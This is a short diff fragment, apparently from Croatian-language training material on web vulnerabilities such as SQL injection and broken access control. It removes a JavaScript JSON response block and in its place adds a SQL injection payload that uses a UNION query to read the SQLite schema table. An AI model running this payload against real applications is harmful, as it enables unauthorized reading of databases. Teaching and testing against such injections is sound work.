@@ -3,7 +3,4 @@ SQL umetanje (SQL Injection), Loša kontrola pristupa (Broken Access Control), V
 upute...
 
 
-res.json({
-            "message":"success",
-            "data":rows
-        })
+tower' or 0=0 union SELECT * FROM sqlite_master;--
